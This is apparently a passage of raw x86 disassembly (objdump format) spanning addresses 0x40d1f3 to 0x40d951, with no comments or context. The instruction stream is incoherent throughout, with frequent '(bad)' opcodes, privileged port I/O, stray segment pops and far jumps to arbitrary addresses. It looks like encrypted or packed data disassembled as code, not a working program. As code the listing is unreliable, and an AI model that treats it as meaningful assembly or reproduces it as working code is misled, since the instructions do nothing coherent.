  40d1f3:	xchg   ecx,eax
  40d1f4:	outs   dx,BYTE PTR ds:[esi]
  40d1f5:	add    eax,0x9c40e7b
  40d1fa:	in     eax,dx
  40d1fb:	test   ah,ah
  40d1fd:	cmp    bl,BYTE PTR [edi+0x54]
  40d200:	sub    BYTE PTR [eax-0x23],cl
  40d203:	test   al,0x5e
  40d205:	pop    ds
  40d206:	(bad)  
  40d207:	fimul  DWORD PTR [edx-0x1571252a]
  40d20d:	adc    DWORD PTR [eax+0x66],esp
  40d210:	rcr    BYTE PTR [edi],cl
  40d212:	rol    bh,cl
  40d214:	push   esp
  40d215:	xor    dh,dl
  40d217:	in     al,dx
  40d218:	dec    edx
  40d219:	jmp    0xf2d70a33
  40d21e:	fld    QWORD PTR [edx+0x38ccc70f]
  40d224:	xor    dh,BYTE PTR [ecx]
  40d226:	push   eax
  40d227:	ror    BYTE PTR [eax+ebp*8],cl
  40d22a:	popf   
  40d22b:	mov    esi,ebx
  40d22d:	pop    edx
  40d22e:	jbe    0x40d1e2
  40d230:	sub    eax,0xad6a4d7f
  40d235:	int3   
  40d236:	popa   
  40d237:	in     eax,0x7b
  40d239:	outs   dx,BYTE PTR ds:[esi]
  40d23a:	ret    
  40d23b:	adc    al,0x63
  40d23d:	in     eax,dx
  40d23e:	fucomip st,st(5)
  40d240:	sub    DWORD PTR [esi+ebp*4+0x21aa27c9],ebp
  40d247:	out    0x38,eax
  40d249:	pop    ds
  40d24a:	dec    ebx
  40d24b:	xchg   edi,eax
  40d24c:	or     esi,DWORD PTR [edi+esi*4-0x6f]
  40d250:	(bad)  
  40d251:	out    0xdc,eax
  40d253:	sub    DWORD PTR [eax-0x72],edi
  40d256:	xchg   ebx,eax
  40d257:	fistp  WORD PTR [esi+edx*4]
  40d25a:	add    eax,0xfe0ca035
  40d25f:	mov    ebx,0x4d7e25c7
  40d264:	xor    BYTE PTR [esi+0x65],cl
  40d267:	inc    ebp
  40d268:	and    al,0x8b
  40d26a:	mov    ds:0xb348cf92,eax
  40d270:	mov    eax,ds:0xffada7b3
  40d275:	pop    ds
  40d276:	mov    cl,0x38
  40d278:	ja     0x40d2e2
  40d27a:	cmp    ebx,DWORD PTR [edx+0x48c51ff1]
  40d280:	daa    
  40d281:	bsr    ebp,ebp
  40d284:	adc    DWORD PTR [edx+edi*8+0x1d4854b2],edx
  40d28b:	add    ebp,DWORD PTR [edi-0x19]
  40d28e:	icebp  
  40d28f:	mov    ebp,0x4d065b52
  40d294:	rol    DWORD PTR [ecx-0x4782c3b1],cl
  40d29a:	mov    WORD PTR [esi],?
  40d29c:	sub    bh,BYTE PTR [ecx-0x5]
  40d29f:	push   ebx
  40d2a0:	push   0xffffffbe
  40d2a2:	adc    dh,bl
  40d2a4:	aaa    
  40d2a5:	ds pop ecx
  40d2a7:	and    esi,esi
  40d2a9:	test   DWORD PTR [edx+ebp*8-0x61],ebp
  40d2ad:	(bad)  
  40d2af:	pop    ebp
  40d2b0:	mov    al,0xf9
  40d2b2:	ror    BYTE PTR [ebx],1
  40d2b4:	mov    ecx,0x60fdbcf6
  40d2b9:	cld    
  40d2ba:	bound  edi,QWORD PTR [eax]
  40d2bc:	test   bh,al
  40d2be:	pop    edi
  40d2bf:	xor    DWORD PTR ds:0x333470bc,esi
  40d2c5:	in     eax,0x8c
  40d2c7:	cmp    eax,0x1a7223c4
  40d2cc:	jmp    0x8a42:0x59369dce
  40d2d3:	jmp    0x40d2d2
  40d2d5:	pop    edx
  40d2d6:	out    dx,al
  40d2d7:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40d2d9:	hlt    
  40d2da:	mov    ch,0x84
  40d2dc:	fwait
  40d2dd:	je     0x40d300
  40d2df:	push   es
  40d2e0:	jns    0x40d2e3
  40d2e2:	inc    eax
  40d2e3:	rcr    BYTE PTR [esi+0x43],0xbd
  40d2e7:	ret    0x9e7f
  40d2ea:	scas   eax,DWORD PTR es:[edi]
  40d2eb:	(bad)  
  40d2ec:	xchg   edx,eax
  40d2ed:	les    esp,FWORD PTR [ecx+eiz*1]
  40d2f0:	mov    esp,0xe29f3284
  40d2f5:	aas    
  40d2f6:	or     ebp,DWORD PTR [eax]
  40d2f8:	cwde   
  40d2f9:	ins    BYTE PTR es:[edi],dx
  40d2fa:	outs   dx,DWORD PTR ds:[esi]
  40d2fb:	(bad)  
  40d2fc:	cmp    DWORD PTR [ebx],ebx
  40d2fe:	jle    0x40d2a2
  40d300:	nop
  40d301:	ret    0x93bd
  40d304:	les    eax,FWORD PTR [edi-0x1ae84127]
  40d30a:	js     0x40d2ec
  40d30c:	dec    ebx
  40d30d:	sbb    DWORD PTR [esi+0x28],ebp
  40d310:	or     bh,dl
  40d312:	pop    ds
  40d313:	pushf  
  40d314:	cwde   
  40d315:	sub    DWORD PTR [esp+edi*8+0x67f90512],0xcb759d01
  40d320:	jg     0x40d308
  40d322:	ret    
  40d323:	and    DWORD PTR [ecx-0x41aaffc5],ebp
  40d329:	fldenv [ebp+ebp*2+0xfad4891]
  40d330:	ret    0x85bd
  40d333:	ret    
  40d334:	arpl   bx,cx
  40d336:	test   al,0x5e
  40d338:	sahf   
  40d339:	jecxz  0x40d33a
  40d33b:	sbb    eax,esi
  40d33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d33e:	push   ebp
  40d33f:	inc    eax
  40d340:	fs xor eax,0xcbce6dd2
  40d346:	xchg   edx,eax
  40d347:	or     ebx,DWORD PTR [ebp-0x154645b6]
  40d34d:	xchg   esp,eax
  40d34e:	sub    DWORD PTR [ebp+0x68ee303c],edi
  40d354:	vhaddps ymm1,ymm7,YMMWORD PTR [edi]
  40d358:	int    0x69
  40d35a:	dec    edi
  40d35b:	inc    eax
  40d35c:	jae    0x40d37d
  40d35e:	jge    0x40d38d
  40d360:	mov    ah,bh
  40d362:	jmp    0x40d365
  40d364:	fs retf 0xe75
  40d368:	sub    al,0x82
  40d36a:	clc    
  40d36b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d36c:	in     eax,dx
  40d36d:	loope  0x40d31a
  40d36f:	jg     0x40d3ec
  40d371:	clc    
  40d372:	push   cs
  40d373:	xor    DWORD PTR [esi+0x5897f13a],esi
  40d379:	inc    ebx
  40d37a:	mov    cl,0x46
  40d37c:	xor    edx,ecx
  40d37e:	lahf   
  40d37f:	mov    eax,DWORD PTR [ecx-0x65b6f8f5]
  40d385:	jecxz  0x40d3ec
  40d387:	les    esp,FWORD PTR [edx+0x2c]
  40d38a:	add    al,0xb
  40d38c:	pop    ds
  40d38d:	jp     0x40d311
  40d38f:	add    edi,eax
  40d391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d392:	mov    ecx,0xa127af54
  40d397:	add    esi,ebp
  40d399:	imul   eax,DWORD PTR [eax],0x26
  40d39c:	or     bl,BYTE PTR [edx]
  40d39e:	fild   QWORD PTR [edi+0x2d]
  40d3a1:	lods   al,BYTE PTR ds:[esi]
  40d3a2:	xchg   ecx,eax
  40d3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3a4:	aas    
  40d3a5:	mov    eax,0x5adf1068
  40d3aa:	push   ecx
  40d3ab:	js     0x40d381
  40d3ad:	mov    al,0xaa
  40d3af:	(bad)  
  40d3b0:	cmp    eax,0x61ba88c3
  40d3b5:	dec    esi
  40d3b6:	sahf   
  40d3b7:	test   al,0x8c
  40d3b9:	arpl   WORD PTR [eax+0x156ddbbf],si
  40d3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3c0:	aam    0xfe
  40d3c2:	jp     0x40d348
  40d3c4:	cmp    eax,0x42ae4f84
  40d3c9:	adc    eax,esi
  40d3cb:	cwde   
  40d3cc:	xchg   esp,eax
  40d3cd:	inc    edx
  40d3ce:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3d0:	xchg   esi,eax
  40d3d1:	pop    esp
  40d3d2:	cwde   
  40d3d3:	adc    esp,esi
  40d3d5:	push   esi
  40d3d6:	add    BYTE PTR [ebx-0x79],ch
  40d3d9:	inc    ecx
  40d3da:	stc    
  40d3db:	sub    BYTE PTR [ebx-0x6d],al
  40d3de:	mov    cl,0x75
  40d3e0:	pop    esi
  40d3e1:	cwde   
  40d3e2:	sub    DWORD PTR [eax-0xc],ebp
  40d3e5:	jo     0x40d441
  40d3e7:	(bad)  
  40d3e8:	aaa    
  40d3e9:	jmp    0x71e9:0xb95cc862
  40d3f0:	or     edx,DWORD PTR [esi+0x71]
  40d3f3:	adc    esi,DWORD PTR [ecx]
  40d3f5:	jle    0x40d447
  40d3f7:	not    DWORD PTR [eax-0x4e]
  40d3fa:	mov    al,ds:0xfe8ebbd6
  40d3ff:	loop   0x40d3dd
  40d401:	mov    esi,DWORD PTR [edi-0x4f429a63]
  40d407:	push   edi
  40d408:	cwde   
  40d409:	cwde   
  40d40a:	ss and ch,ah
  40d40d:	dec    esi
  40d40e:	dec    ebp
  40d40f:	into   
  40d410:	lahf   
  40d411:	or     eax,0x6071c852
  40d416:	dec    ecx
  40d417:	retf   0x72cf
  40d41a:	inc    ebp
  40d41b:	rcl    DWORD PTR [eax+0x4134909c],0x2d
  40d422:	(bad)  
  40d423:	out    0xac,eax
  40d425:	jecxz  0x40d42e
  40d427:	or     ebp,DWORD PTR [edx]
  40d429:	dec    esi
  40d42a:	xchg   edi,eax
  40d42b:	mov    al,0xe5
  40d42d:	div    esp
  40d42f:	enter  0x7bb,0xf8
  40d433:	lods   al,BYTE PTR ds:[esi]
  40d434:	enter  0x902e,0x73
  40d438:	shl    esp,1
  40d43a:	xor    ebp,ebx
  40d43c:	fisub  DWORD PTR ds:0x471ae2c4
  40d442:	out    dx,al
  40d443:	sbb    BYTE PTR [ebx],al
  40d445:	retf   
  40d446:	cs xor eax,0xa4092e38
  40d44c:	gs stos DWORD PTR es:[edi],eax
  40d44e:	fs fs jge 0x40d4ad
  40d452:	push   ebp
  40d453:	in     al,0x3a
  40d455:	sbb    BYTE PTR [eax-0x1768dc64],ch
  40d45b:	cld    
  40d45c:	mov    ebx,0x40b88a0a
  40d461:	data16 repz xor cl,ah
  40d465:	mov    ah,0xf4
  40d467:	jo     0x40d40b
  40d469:	xor    al,0xf4
  40d46b:	dec    edi
  40d46c:	test   eax,0x8241d0da
  40d471:	jns    0x40d45e
  40d473:	arpl   si,dx
  40d475:	pop    ebp
  40d476:	jge    0x40d4e5
  40d478:	sbb    dl,ah
  40d47a:	out    0x78,eax
  40d47c:	les    esi,FWORD PTR [ebx]
  40d47e:	(bad)  
  40d47f:	push   eax
  40d480:	mov    ebp,esi
  40d482:	mov    eax,DWORD PTR ss:[ebx-0x16abbd33]
  40d489:	shl    BYTE PTR [ecx],cl
  40d48b:	mov    esi,0x917f03ab
  40d490:	scas   al,BYTE PTR es:[edi]
  40d491:	adc    BYTE PTR [ecx+edi*4],dh
  40d494:	repz arpl WORD PTR gs:[edx],bp
  40d498:	add    al,0x29
  40d49a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d49b:	sbb    ch,BYTE PTR [esp+0x25]
  40d49f:	and    esp,DWORD PTR [eax-0x5a46845]
  40d4a5:	(bad)  
  40d4a7:	imul   esp,DWORD PTR [ebp+0x17],0x76498a81
  40d4ae:	retf   0x3f2a
  40d4b1:	retf   
  40d4b2:	jnp    0x40d52e
  40d4b4:	(bad)
  40d4b7:	shl    DWORD PTR [esi],0xa7
  40d4ba:	ficom  DWORD PTR [edi]
  40d4bc:	test   al,0x52
  40d4be:	jp     0x40d442
  40d4c0:	gs push ebx
  40d4c2:	jno    0x40d4f0
  40d4c4:	icebp  
  40d4c5:	xchg   esi,eax
  40d4c6:	fbld   TBYTE PTR [edi+0x49]
  40d4c9:	rcr    esi,0x51
  40d4cc:	hlt    
  40d4cd:	adc    eax,0x62810d41
  40d4d2:	aam    0xb6
  40d4d4:	push   ds
  40d4d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4d6:	stc    
  40d4d7:	or     al,0xf5
  40d4d9:	es dec edx
  40d4db:	test   al,0x22
  40d4dd:	cld    
  40d4de:	scas   eax,DWORD PTR es:[edi]
  40d4df:	xchg   esi,eax
  40d4e0:	les    ax,DWORD PTR [esi-0x2]
  40d4e4:	dec    edx
  40d4e5:	mov    cl,0xa
  40d4e7:	mov    bl,0x36
  40d4e9:	push   ds
  40d4ea:	and    DWORD PTR [eax+0x4050b4ca],ecx
  40d4f0:	sbb    DWORD PTR [ebx],ebx
  40d4f2:	pop    ecx
  40d4f3:	xchg   esi,eax
  40d4f4:	loop   0x40d55b
  40d4f6:	lahf   
  40d4f7:	jb     0x40d4bf
  40d4f9:	push   ebp
  40d4fa:	xchg   esi,eax
  40d4fb:	mov    ebx,0x66a41ed9
  40d500:	je     0x40d4ac
  40d502:	add    BYTE PTR [edi+0x4e],cl
  40d505:	mov    ecx,0xa7ba6cf7
  40d50a:	loope  0x40d53c
  40d50c:	call   0x9b53:0x4afd329b
  40d513:	mov    ds:0x27f124c9,al
  40d518:	outs   dx,BYTE PTR ds:[esi]
  40d519:	push   esp
  40d51a:	das    
  40d51b:	xor    BYTE PTR [ecx-0x1853e991],ch
  40d521:	inc    esi
  40d522:	mov    BYTE PTR [esi],cl
  40d524:	clc    
  40d525:	jmp    0xcf48:0xf4cc3afa
  40d52c:	sub    ecx,eax
  40d52e:	sbb    edx,eax
  40d530:	mov    edx,edx
  40d532:	push   es
  40d533:	and    DWORD PTR [ecx+eiz*8-0x6e],0x5
  40d538:	xor    esi,ecx
  40d53a:	xchg   esp,eax
  40d53b:	push   edi
  40d53c:	cmp    BYTE PTR [ecx],dh
  40d53e:	imul   ebp,DWORD PTR [edi+0x52e05e6b],0xffffffea
  40d545:	pop    ds
  40d546:	dec    edi
  40d547:	std    
  40d548:	je     0x40d575
  40d54a:	aam    0x9f
  40d54c:	fs jne 0x40d536
  40d54f:	and    bl,ch
  40d551:	fistp  DWORD PTR [eax-0x5f]
  40d554:	mov    edx,0x1501ee56
  40d559:	sbb    BYTE PTR [eax+0x41],cl
  40d55c:	aad    0x52
  40d55e:	das    
  40d55f:	jp     0x40d56b
  40d561:	pop    ecx
  40d562:	(bad)  
  40d563:	aad    0x6c
  40d565:	jmp    0xb2a4:0xcee11d74
  40d56c:	jg     0x40d58d
  40d56e:	lock mov edi,0x20f61f0d
  40d574:	dec    eax
  40d575:	xchg   ebx,eax
  40d576:	jo     0x40d56b
  40d578:	and    cl,BYTE PTR [edi-0x71263d86]
  40d57e:	test   BYTE PTR [eax],cl
  40d580:	pop    eax
  40d581:	mov    esp,0xcc4de9a8
  40d586:	cmp    al,0xe0
  40d588:	xor    bl,0xac
  40d58b:	pop    ds
  40d58c:	xchg   bl,dh
  40d58e:	imul   edi,DWORD PTR [edx-0x26],0xffffffdb
  40d592:	hlt    
  40d593:	js     0x40d5c7
  40d595:	outs   dx,BYTE PTR ds:[esi]
  40d596:	or     cl,ch
  40d598:	add    DWORD PTR [eax],esi
  40d59a:	cmp    al,0x3c
  40d59c:	test   al,0xfb
  40d59e:	sbb    al,bh
  40d5a0:	int3   
  40d5a1:	mov    dh,0x1a
  40d5a3:	cmp    edx,0xd324496f
  40d5a9:	lods   al,BYTE PTR ds:[esi]
  40d5aa:	in     eax,dx
  40d5ab:	sub    DWORD PTR [edx-0x4591e8ee],edi
  40d5b1:	adc    al,0x5
  40d5b3:	or     ah,BYTE PTR [edi]
  40d5b5:	mov    edx,ebx
  40d5b7:	mov    ch,0xab
  40d5b9:	sbb    BYTE PTR [eax+ebp*1+0x4d],cl
  40d5bd:	jl     0x40d5f6
  40d5bf:	pusha  
  40d5c0:	ss add al,0x6e
  40d5c3:	mov    dl,0x85
  40d5c5:	xrelease xchg BYTE PTR [edi+0x7a48f5a3],al
  40d5cc:	xor    ah,BYTE PTR [edi]
  40d5ce:	jmp    0x4048:0xb3b8cb81
  40d5d5:	imul   ah
  40d5d7:	(bad)  
  40d5d8:	fnstenv [edx+0x31]
  40d5db:	ffreep st(1)
  40d5dd:	mov    ch,0x96
  40d5df:	test   BYTE PTR [ebp+0x3b],cl
  40d5e2:	mov    WORD PTR [edi+ebx*2+0x6c],ss
  40d5e6:	(bad)  
  40d5e7:	imul   edx,eax,0xffffff9d
  40d5ea:	mov    ebp,0x764163a7
  40d5ef:	dec    BYTE PTR [eax+0x26]
  40d5f2:	cmp    BYTE PTR [esi-0x1aa77785],ch
  40d5f8:	jl     0x40d668
  40d5fa:	mov    cl,0x28
  40d5fc:	test   al,0xe1
  40d5fe:	jns    0x40d5c7
  40d600:	and    esi,DWORD PTR [eax+0x13]
  40d603:	mov    ecx,0xacd9c2a2
  40d608:	mov    al,ds:0xb290b6eb
  40d60d:	push   0x3ce9fab0
  40d612:	(bad)  
  40d613:	lods   eax,DWORD PTR ds:[esi]
  40d614:	lods   eax,DWORD PTR ds:[esi]
  40d615:	andnps xmm5,xmm2
  40d618:	sub    eax,0xe81d4dc4
  40d61d:	jo     0x40d5a8
  40d61f:	mov    edx,0x5d2e7d9
  40d624:	bound  ecx,QWORD PTR [edi]
  40d626:	fist   WORD PTR [ecx+0x7d034f1]
  40d62c:	jnp    0x40d684
  40d62e:	pop    esp
  40d62f:	test   DWORD PTR [edi],0x2be7c120
  40d635:	ficom  WORD PTR [edi+esi*8+0x492142c9]
  40d63c:	bound  eax,QWORD PTR [esi+esi*1]
  40d63f:	add    dl,ch
  40d641:	(bad)  
  40d643:	and    bh,BYTE PTR [ecx]
  40d645:	data16 sti 
  40d647:	pop    ebx
  40d648:	rcl    DWORD PTR ds:0x3bcc2499,cl
  40d64e:	inc    edi
  40d64f:	sbb    BYTE PTR [edi],bl
  40d651:	lods   eax,DWORD PTR ds:[esi]
  40d652:	sahf   
  40d653:	pop    ebx
  40d654:	mov    ebp,0x497c1f70
  40d659:	ins    BYTE PTR es:[edi],dx
  40d65a:	lock shl edx,cl
  40d65d:	and    DWORD PTR [ebx+edx*2+0x284045d1],ebx
  40d664:	dec    eax
  40d665:	mov    ds:0xa91d8068,al
  40d66a:	mov    eax,0xa46f9d02
  40d66f:	stc    
  40d670:	mov    ebp,0xc6f3fadb
  40d675:	xor    al,0x63
  40d677:	mov    ss,WORD PTR [esi]
  40d679:	pop    ebx
  40d67a:	loopne 0x40d6d8
  40d67c:	fwait
  40d67d:	adc    edi,DWORD PTR [edx+0x56]
  40d680:	loopne 0x40d6ba
  40d682:	pop    esi
  40d683:	jno    0x40d6e2
  40d685:	xor    eax,0xd938933f
  40d68a:	je     0x40d661
  40d68c:	mov    ecx,0x6babfe11
  40d691:	stos   DWORD PTR es:[edi],eax
  40d692:	ret    
  40d693:	or     BYTE PTR [ebp-0x31],bl
  40d696:	cmp    ebp,DWORD PTR [esi+0x4e61e58]
  40d69c:	mov    esi,ebp
  40d69e:	mov    eax,ds:0xf6dc0ad1
  40d6a3:	mul    bh
  40d6a5:	or     BYTE PTR [ebx+0x69],bh
  40d6a8:	and    ch,BYTE PTR [edi]
  40d6aa:	mov    bh,0xc8
  40d6ac:	pushf  
  40d6ad:	mov    cl,BYTE PTR [edi-0x70]
  40d6b0:	jbe    0x40d6fb
  40d6b2:	aad    0x7c
  40d6b4:	push   ebp
  40d6b5:	dec    edi
  40d6b6:	lods   eax,DWORD PTR ds:[esi]
  40d6b7:	pop    ebx
  40d6b8:	jns    0x40d6fc
  40d6ba:	jge    0x40d720
  40d6bc:	jo     0x40d6c1
  40d6be:	mov    BYTE PTR [edx],bl
  40d6c0:	xchg   esi,eax
  40d6c1:	loop   0x40d65d
  40d6c3:	pop    edi
  40d6c4:	mov    esp,0xa75960f
  40d6c9:	test   al,0x40
  40d6cb:	(bad)  
  40d6cc:	sub    eax,0x644fc651
  40d6d1:	sub    bl,0xa9
  40d6d4:	sub    DWORD PTR [ecx+0x7b],eax
  40d6d7:	mov    ah,0x60
  40d6d9:	dec    esp
  40d6da:	scas   eax,DWORD PTR es:[edi]
  40d6db:	outs   dx,DWORD PTR ds:[esi]
  40d6dc:	mov    BYTE PTR [ebx+0x22],ch
  40d6df:	out    0x83,al
  40d6e1:	xchg   ebp,eax
  40d6e2:	int3   
  40d6e3:	aas    
  40d6e4:	out    dx,al
  40d6e5:	inc    ebp
  40d6e6:	std    
  40d6e7:	loope  0x40d762
  40d6e9:	pop    es
  40d6ea:	or     eax,0x35865cb
  40d6ef:	(bad)  
  40d6f0:	and    al,0x9
  40d6f2:	xlat   BYTE PTR ds:[ebx]
  40d6f3:	dec    ecx
  40d6f4:	jne    0x40d682
  40d6f6:	dec    edx
  40d6f7:	test   al,0x18
  40d6f9:	sbb    eax,0xf21419c9
  40d6fe:	jp     0x40d6b1
  40d700:	dec    ebx
  40d701:	dec    eax
  40d702:	mov    edx,0xe939b0ed
  40d707:	stos   BYTE PTR es:[edi],al
  40d708:	(bad)  
  40d709:	cli    
  40d70a:	leave  
  40d70b:	ja     0x40d6d5
  40d70d:	or     al,0xd1
  40d70f:	stos   DWORD PTR es:[edi],eax
  40d710:	sbb    eax,0x998d3fa
  40d715:	out    0xbe,eax
  40d717:	push   es
  40d718:	nop
  40d719:	ror    edx,cl
  40d71b:	js     0x40d777
  40d71d:	pop    edi
  40d71e:	pusha  
  40d71f:	mov    ?,WORD PTR ds:0x9ba93f4d
  40d725:	sbb    DWORD PTR [edx],ebp
  40d727:	jne    0x40d762
  40d729:	pop    ebp
  40d72a:	repz sar BYTE PTR [ecx-0x79],cl
  40d72e:	mov    bl,0xd4
  40d730:	nop
  40d731:	into   
  40d732:	clc    
  40d733:	cmp    BYTE PTR [ebp-0x3d83dc1b],bl
  40d739:	inc    esi
  40d73a:	mov    eax,0x7fb1cca2
  40d73f:	jl     0x40d710
  40d741:	mov    BYTE PTR [esi+0x74],bl
  40d744:	and    al,0x94
  40d746:	dec    DWORD PTR [edi+eiz*1-0x58]
  40d74a:	xchg   esp,eax
  40d74b:	add    esp,DWORD PTR [ecx-0x6a]
  40d74e:	icebp  
  40d74f:	or     al,BYTE PTR [ecx+edx*2-0x14e71046]
  40d756:	test   BYTE PTR [ebx-0x684c4d41],0xad
  40d75d:	lock cmp al,dh
  40d760:	lods   al,BYTE PTR ds:[esi]
  40d761:	add    DWORD PTR [ecx],edx
  40d763:	icebp  
  40d764:	mov    edx,0x6dcf98a0
  40d769:	mov    ebx,0x2ad48abf
  40d76e:	push   ebp
  40d76f:	and    DWORD PTR [ebx+edi*4-0x63edfbee],ecx
  40d776:	xchg   ebx,eax
  40d777:	lahf   
  40d778:	add    eax,esi
  40d77a:	sub    eax,0x43090a1b
  40d77f:	test   eax,0x21196c59
  40d784:	repnz or eax,0x2b4acc90
  40d78a:	retf   
  40d78b:	sub    al,0x9
  40d78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d78e:	out    0x63,eax
  40d790:	aam    0xf8
  40d792:	lds    esp,FWORD PTR [ecx]
  40d794:	lds    esp,FWORD PTR [ebx]
  40d796:	es jmp 0x63de:0x4a126188
  40d79e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d79f:	cmp    ah,BYTE PTR ds:0x7983f737
  40d7a5:	sub    al,0x59
  40d7a7:	sbb    esi,DWORD PTR [esp+edx*8]
  40d7aa:	loope  0x40d824
  40d7ac:	adc    dl,0xf1
  40d7af:	clc    
  40d7b0:	sbb    DWORD PTR [ebx+0x6b],edi
  40d7b3:	mov    eax,0xb21de0aa
  40d7b8:	aam    0x31
  40d7ba:	mov    esp,0x9fbbe26f
  40d7bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c0:	push   es
  40d7c1:	adc    eax,0x53fee065
  40d7c6:	loopne 0x40d7a4
  40d7c8:	sbb    ecx,ecx
  40d7ca:	popf   
  40d7cb:	stos   DWORD PTR es:[edi],eax
  40d7cc:	dec    esi
  40d7cd:	loope  0x40d78a
  40d7cf:	mov    bl,0x4f
  40d7d1:	pushf  
  40d7d2:	and    DWORD PTR [ecx-0x58775e8d],esp
  40d7d8:	xchg   BYTE PTR [ebx+0x58f990b4],ah
  40d7de:	mov    bl,0xbb
  40d7e0:	lods   al,BYTE PTR ds:[esi]
  40d7e1:	outs   dx,BYTE PTR ds:[esi]
  40d7e2:	or     al,0x81
  40d7e4:	or     DWORD PTR [edi+ecx*8-0xe],ecx
  40d7e8:	add    ecx,DWORD PTR [eax]
  40d7ea:	push   0x4799f4ad
  40d7ef:	int3   
  40d7f0:	sub    cl,BYTE PTR [esi+eiz*4-0x11ee6e55]
  40d7f7:	adc    eax,0x71eea79f
  40d7fc:	call   0xaf222f1b
  40d801:	xchg   edx,eax
  40d802:	jl     0x40d7a2
  40d804:	ficom  DWORD PTR [edi+esi*1-0x4429d2c0]
  40d80b:	stos   DWORD PTR es:[edi],eax
  40d80c:	out    dx,al
  40d80d:	aas    
  40d80e:	out    0x51,eax
  40d810:	mov    al,0xde
  40d812:	call   0x6c1e:0x411a42c9
  40d819:	mov    cs,WORD PTR [edx-0x1bce835b]
  40d81f:	inc    ebx
  40d820:	pop    ds
  40d821:	mov    dl,0x3
  40d823:	pop    esp
  40d824:	jle    0x40d7ee
  40d826:	cmp    eax,0xc39cbf7f
  40d82b:	xor    bh,BYTE PTR [edi-0x57]
  40d82e:	add    cl,BYTE PTR [esi+0x20955b88]
  40d834:	fld    DWORD PTR [eax]
  40d836:	inc    ebx
  40d837:	mov    ecx,0x1eaffb75
  40d83c:	jne    0x40d860
  40d83e:	sub    esi,DWORD PTR [ecx+ebx*4+0x3b]
  40d842:	(bad)
  40d846:	int3   
  40d847:	loope  0x40d86c
  40d849:	imul   ebp,DWORD PTR [edx],0x5f
  40d84c:	and    edx,DWORD PTR [ecx+eax*2]
  40d84f:	or     eax,0x391616b7
  40d854:	fstp   QWORD PTR [edx]
  40d856:	jl     0x40d8b7
  40d858:	stc    
  40d859:	(bad)  
  40d85a:	mov    DWORD PTR [edi-0x7e51b119],eax
  40d860:	jg     0x40d7e7
  40d862:	pop    ecx
  40d863:	push   bx
  40d865:	mov    cl,0x15
  40d867:	mov    ebp,0xfd64d9ab
  40d86c:	lds    edx,FWORD PTR [eax-0x297a766e]
  40d872:	jle    0x40d866
  40d874:	pushf  
  40d875:	ret    0x9703
  40d878:	pop    edx
  40d879:	(bad)  
  40d87a:	xchg   ebp,eax
  40d87b:	arpl   WORD PTR [ebx-0x33],si
  40d87e:	or     ebp,DWORD PTR [esi]
  40d880:	jns    0x40d8d8
  40d882:	or     eax,0xe230e8f1
  40d887:	ret    
  40d888:	test   al,0xcd
  40d88a:	dec    esp
  40d88b:	in     eax,dx
  40d88c:	inc    esp
  40d88d:	and    al,0xa6
  40d88f:	nop
  40d890:	ss mov ecx,0xa7876478
  40d896:	or     al,0x68
  40d898:	call   0xe0df:0x80a45ad6
  40d89f:	adc    DWORD PTR [edi],ebp
  40d8a1:	dec    ebp
  40d8a2:	ins    DWORD PTR es:[edi],dx
  40d8a3:	shr    BYTE PTR [ebx],cl
  40d8a5:	add    al,0x28
  40d8a7:	cmc    
  40d8a8:	or     ebp,ecx
  40d8aa:	jge    0x40d86a
  40d8ac:	sbb    BYTE PTR [ebx+0x27],dh
  40d8af:	call   0x2bb5024b
  40d8b4:	pop    edx
  40d8b5:	jnp    0x40d8aa
  40d8b7:	imul   esi,DWORD PTR [ebp-0x3944ea6c],0x7def46da
  40d8c1:	mov    eax,0xf2a98fbc
  40d8c6:	mov    BYTE PTR [ecx+eiz*4+0x30d48b6],dh
  40d8cd:	in     eax,dx
  40d8ce:	inc    ebx
  40d8cf:	int3   
  40d8d0:	adc    al,0xce
  40d8d2:	test   DWORD PTR [edi],ebx
  40d8d4:	fist   WORD PTR [eax+0x5b]
  40d8d7:	sar    BYTE PTR [ebx+0x50],0xf7
  40d8db:	out    dx,eax
  40d8dc:	das    
  40d8dd:	aas    
  40d8de:	pop    ds
  40d8df:	pop    ecx
  40d8e0:	sahf   
  40d8e1:	mov    al,ds:0x273a4124
  40d8e6:	add    eax,esi
  40d8e8:	cmp    eax,DWORD PTR [edi]
  40d8ea:	jnp    0x40d945
  40d8ec:	cmp    eax,0xbd45fc99
  40d8f1:	daa    
  40d8f2:	out    dx,eax
  40d8f3:	(bad)  
  40d8f4:	loopne 0x40d950
  40d8f6:	cmp    eax,0xf29f50b0
  40d8fb:	xor    al,0x83
  40d8fd:	mov    dl,0xf4
  40d8ff:	inc    ebp
  40d900:	jo     0x40d904
  40d902:	call   0xb2414013
  40d907:	shr    ch,0xd9
  40d90a:	retf   
  40d90b:	mov    ebp,0x19614069
  40d910:	add    esi,ecx
  40d912:	not    BYTE PTR [eax-0x16d19371]
  40d918:	pop    esp
  40d919:	mov    ch,BYTE PTR [esi+0x4c07b59e]
  40d91f:	dec    eax
  40d920:	inc    esi
  40d921:	xchg   ebx,eax
  40d922:	div    BYTE PTR [ecx-0x39]
  40d925:	(bad)  
  40d926:	mov    edi,0x5f83d4f0
  40d92b:	adc    DWORD PTR [ebx+0x4a],eax
  40d92e:	ins    BYTE PTR es:[edi],dx
  40d92f:	(bad)  
  40d930:	je     0x40d993
  40d932:	cmc    
  40d933:	mov    DWORD PTR [edi-0x42],edi
  40d936:	cwde   
  40d937:	in     al,dx
  40d938:	mov    ebp,0xc6567ea3
  40d93d:	push   0x2d798c77
  40d942:	jo     0x40d948
  40d944:	or     al,0xf3
  40d946:	and    ebp,DWORD PTR [ecx]
  40d948:	loope  0x40d8f9
  40d94a:	lods   al,BYTE PTR ds:[esi]
  40d94b:	das    
  40d94c:	pop    ebp
  40d94d:	jle    0x40d99c
  40d94f:	cmp    bh,bh
  40d951:	and    eax,0x222474c6
